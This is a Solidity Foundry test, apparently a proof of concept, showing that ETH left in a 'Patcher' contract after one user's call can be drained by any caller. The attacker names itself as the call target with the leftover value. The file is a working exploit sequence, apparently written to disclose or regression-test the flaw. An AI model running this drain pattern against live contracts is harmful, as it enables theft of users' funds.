// SPDX-License-Identifier: LGPL-3.0
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Patcher} from "../../../src/Periphery/Patcher.sol";

contract DummyValueSource {
    uint256 public value;
    function setValue(uint256 _value) external { value = _value; }
    function getValue() external view returns (uint256) { return value; }
}

contract DummyTarget {
    function processValue(uint256 /*_value*/ ) external payable {}
}

contract PatcherEthDrainTest is Test {
    Patcher internal patcher;
    DummyValueSource internal valueSource;
    DummyTarget internal target;
    address internal victim = address(0x1111);
    address internal attacker = address(0xBEEF);

    function setUp() public {
        patcher = new Patcher();
        valueSource = new DummyValueSource();
        target = new DummyTarget();
        vm.deal(victim, 1 ether);
    }

    function test_LeftoverETHCanBeStolenByAnyone() public {
        bytes memory originalCalldata = abi.encodeWithSelector(
            target.processValue.selector,
            uint256(0)
        );
        uint256[] memory offsets = new uint256[](1);
        offsets[0] = 4;
        bytes memory valueGetter = abi.encodeWithSelector(
            valueSource.getValue.selector
        );

        vm.prank(victim);
        patcher.executeWithDynamicPatches{value: 1 ether}(
            address(valueSource),
            valueGetter,
            address(target),
            0,
            originalCalldata,
            offsets,
            false
        );
        assertEq(address(patcher).balance, 1 ether);

        bytes memory drainData = abi.encode(uint256(0));
        uint256[] memory drainOffsets = new uint256[](1);
        drainOffsets[0] = 0;

        vm.prank(attacker);
        patcher.executeWithDynamicPatches(
            address(valueSource),
            valueGetter,
            attacker,
            1 ether,
            drainData,
            drainOffsets,
            false
        );
        assertEq(attacker.balance, 1 ether);
    }
}

